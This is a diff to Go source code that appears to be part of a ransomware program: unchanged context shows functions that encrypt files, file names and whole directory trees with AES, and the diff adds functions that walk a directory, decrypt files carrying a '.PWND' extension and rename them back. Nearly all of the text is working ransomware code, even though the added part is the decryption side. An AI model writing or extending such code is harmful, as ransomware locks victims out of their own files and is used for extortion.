@@ -34,6 +34,12 @@ func EncryptFile(fileName string, key []byte) {
 	WriteToFile(fileName, encryptedData)
 }
 
+func DecryptFile(filename string, key []byte) {
+	cipherText := GetFileContent(filename)
+	decryptedData := DecryptDataAES(key, cipherText)
+	WriteToFile(filename, decryptedData)
+}
+
 func EncryptFileName(fileName string, key []byte) string {
 	fileNameBytes := []byte(fileName)
 	encryptedFileName := EncryptDataAES(key, fileNameBytes)
@@ -59,7 +65,17 @@ func EncryptSystem(root string, targets []string, key []byte) []string {
 	return files
 }
 
-func GetFileDirectory(filePath string, fileName string) string {
-	basePath := strings.ReplaceAll(filePath, fileName, "")
-	return basePath
+func DecryptSystem(root string, key []byte) []string {
+	var files []string
+	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
+		// We only care for files with the .PWND extension.
+		if !d.IsDir() && HasMatchingExtension(path, []string{".PWND"}) {
+			DecryptFile(path, key)
+			os.Rename(path, strings.ReplaceAll(path, ".PWND", ""))
+			files = append(files, path)
+		}
+		return nil
+	})
+	checkError(err)
+	return files
 }
